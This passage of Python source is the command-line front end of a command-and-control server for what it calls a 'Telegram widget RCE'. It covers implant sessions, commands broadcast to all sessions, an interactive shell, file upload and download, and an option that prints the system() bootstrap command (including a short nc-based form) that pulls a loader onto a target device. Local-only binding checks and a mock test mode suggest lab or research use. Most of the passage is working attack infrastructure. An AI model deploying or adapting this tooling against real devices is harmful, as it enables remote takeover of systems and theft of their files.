        self.s.log.command(x.sid, implant, raw, True)

    def cmd_broadcast(self, cmd: str, raw: str) -> None:
        for x in self.s.alive_sessions():
            try:
                say("=== session %d (%s) ===" % (x.sid, x.hello.get("implant")))
                res = self.s.op_exec(x, cmd, on_chunk=self._print_chunk)
                say("[exec rc=%s]" % res.get("rc"))
            except SessionError as e:
                say("[!] session %d: %s" % (x.sid, e), err=True)
        self.s.log.command(None, "*", raw, True)

    def cmd_wait(self, arg: str) -> None:
        parts = arg.split()
        if not parts:
            raise SessionError("usage: wait <secs> [count]")
        n = float(parts[0])
        count = int(parts[1]) if len(parts) > 1 else 1
        sess = self.s.wait_session(n, count)
        if sess is None:
            raise SessionError("fewer than %d sessions within %.0fs" % (count, n))
        alive = self.s.alive_sessions()
        if self.s.active is None:
            self.s.active = sess
        say("[+] %d live session(s)" % len(alive))

    def interactive(self) -> None:
        say("C2 interactive. Type 'help'.")
        while not self.s.stop.is_set():
            try:
                a = self.s.active
                prompt = "(s%d %s) > " % (a.sid, a.hello.get("implant", "?")) if a else "c2> "
                line = input(prompt)
            except (EOFError, KeyboardInterrupt):
                say("")
                break
            if self.run_line(line) == "quit":
                break
        self.s.shutdown()

    def batch(self, lines: List[str]) -> None:
        for line in lines:
            if self.s.stop.is_set():
                break
            say(">>> %s" % line)
            if self.run_line(line) == "quit":
                break
        self.s.shutdown()


# ---------------------------------------------------------------------- main
def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="Local-only C2 for the Telegram widget RCE (stdlib only)")
    p.add_argument("--host", default="127.0.0.1",
                   help="bind address: loopback, or a private LAN IP with --allow-lan")
    p.add_argument("--port", type=int, default=common.DEFAULT_CONTROL_PORT,
                   help="control port (default 4444)")
    p.add_argument("--loader-port", type=int, default=common.DEFAULT_LOADER_PORT,
                   help="bootstrap/loader port (default 5555; 0 disables)")
    p.add_argument("--allow-lan", action="store_true",
                   help="allow binding a private/LAN address (never public)")
    p.add_argument("--token", default="",
                   help="shared token; implants loaded by this server get it embedded")
    p.add_argument("--log-dir", default=os.path.join(common.C2_ROOT, "logs"))
    p.add_argument("--download-dir", default=os.path.join(common.C2_ROOT, "downloads"))
    p.add_argument("--ping-interval", type=float, default=30.0)
    p.add_argument("--ping-timeout", type=float, default=120.0)
    p.add_argument("--exec-timeout", type=float, default=120.0)
    p.add_argument("--auto-shell", action=argparse.BooleanOptionalAction,
                   default=True,
                   help="interactive mode: auto-select the first live session "
                        "and run unrecognized lines as shell commands "
                        "(default: enabled; use --no-auto-shell to disable)")
    p.add_argument("--prune-dead-on-connect",
                   action=argparse.BooleanOptionalAction, default=True,
                   help="remove dead sessions from the table when a new "
                        "implant connects (default: enabled)")
    p.add_argument("--max-out", type=int, default=common.MAX_EXEC_OUT)
    p.add_argument("--max-put", type=int, default=common.MAX_PUT,
                   help="max base64 length for one 'put' message; larger files "
                        "are uploaded in chunks")
    p.add_argument("--max-get", type=int, default=common.MAX_GET)
    p.add_argument("--log-payloads", action="store_true",
                   help="log base64 payloads (large; off by default)")
    p.add_argument("--allow-any-output", action="store_true",
                   help="allow 'get <remote> <local>' outside --download-dir")
    p.add_argument("--loader-mock-dir", metavar="DIR", default=None,
                   help="serve a host-mock bootstrap that writes into DIR "
                        "(for run_local_test.sh; never for a device)")
    p.add_argument("--bootstrap-diag", action="store_true",
                   help="loader serves a one-shot C2_DIAG=1 script instead of "
                        "installing the supervisor (first device hello test)")
    p.add_argument("--diag-xtrace", action="store_true",
                   help="with --bootstrap-diag, run the diag with set -x into "
                        "$D/diag.trace (contains the token; app-private)")
    p.add_argument("--wait-session", type=float, default=0.0,
                   help="wait this many seconds for a session before batch commands")
    p.add_argument("--cmd", action="append", default=[],
                   help="batch command (repeatable)")
    p.add_argument("--script", default=None,
                   help="file with one CLI command per line")
    p.add_argument("--bootstrap", choices=("toybox", "nc"), default="toybox",
                   help="form of the system() bootstrap printed/logged: "
                        "'toybox' = 80-char absolute-path (default), "
                        "'nc' = <=50-char PATH-applet form for the 50-byte "
                        "c2560s_c2 widget")
    p.add_argument("--print-bootstrap", action="store_true",
                   help="print the exact system() command and exit")
    p.add_argument("--version", action="version", version=common.VERSION)
    return p


def main(argv: Optional[List[str]] = None) -> int:
    args = build_parser().parse_args(argv)

    try:
        common.check_bind_host(args.host, args.allow_lan)
        common.check_token(args.token)
    except (common.SafeBindError, ValueError) as e:
        say("[!] %s" % e, err=True)
        return 2

    if args.loader_port and args.loader_port == args.port:
        say("[!] --loader-port must differ from --port", err=True)
        return 2
    if args.diag_xtrace and not args.bootstrap_diag:
        say("[!] --diag-xtrace requires --bootstrap-diag", err=True)
        return 2
    if args.loader_mock_dir:
        os.makedirs(args.loader_mock_dir, exist_ok=True)

    if args.print_bootstrap:
        mock = bool(args.loader_mock_dir)
        if not args.loader_port:
            say("[!] loader port disabled; nothing to bootstrap", err=True)
            return 2
        try:
            cmd = common.bootstrap_command(args.host, args.loader_port,
                                           mock=mock,
                                           short=(args.bootstrap == "nc"))
        except ValueError as e:
            say("[!] %s" % e, err=True)
            return 2
        say("RCE command (%d chars, feed to system()):" % len(cmd))
        say(cmd)
        say("")
        say("Loader URL target: %s:%d" % (args.host, args.loader_port))
        if args.bootstrap == "nc":
            say("Short form: bare nc/sleep/sh/setsid from PATH "
                "(limit %d chars)" % common.SHORT_BOOTSTRAP_MAX)
        return 0

    lines: List[str] = []
    for c in args.cmd:
        lines.append(c)
    if args.script:
        try:
            with open(args.script, "r", encoding="utf-8") as f:
                for row in f:
                    row = row.strip()
                    if row and not row.startswith("#"):
                        lines.append(row)
        except OSError as e:
            say("[!] cannot read script: %s" % e, err=True)
            return 2

    server = C2Server(args)
    try:
        server.start()
    except OSError as e:
        say("[!] cannot bind %s:%d / loader :%d: %s"
            % (args.host, args.port, args.loader_port, e), err=True)
        return 1

    if args.wait_session > 0:
        say("[*] waiting up to %.0fs for a session..." % args.wait_session)
        if server.wait_session(args.wait_session) is None and lines:
            say("[!] no session; running batch anyway (commands will fail)", err=True)

    cli = CLI(server, auto_shell=args.auto_shell)
    if lines:
        cli.batch(lines)
    else:
        cli.interactive()
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
